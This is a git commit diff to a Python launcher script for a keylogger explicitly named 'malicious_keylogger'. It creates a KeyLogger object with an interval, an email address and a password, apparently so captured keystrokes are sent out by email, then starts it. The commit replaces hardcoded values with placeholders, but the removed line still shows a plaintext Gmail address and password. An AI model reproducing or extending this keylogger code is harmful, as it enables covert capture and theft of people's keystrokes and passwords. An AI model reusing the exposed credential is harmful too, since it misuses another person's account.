aa98b1b7ae7f1e4e92fad48cd6976c2913e87cdb
Mark Jackson <135349161+mwjackson21@users.noreply.github.com>
2024-05-31 12:52:19 -0400

    Update execute_keylogger.py

--- execute_keylogger.py
+++ execute_keylogger.py
@@ -1,7 +1,7 @@
 import keylogger_project
 
 # Initialize / create keylogger
-malicious_keylogger = keylogger_project.KeyLogger(10, 'testemailforprojects30@gmail.com', 'GsP78HN45A9')
+malicious_keylogger = keylogger_project.KeyLogger(10, 'insert_email', 'insert_password')
 
 # Execute Keylogger
 malicious_keylogger.start()
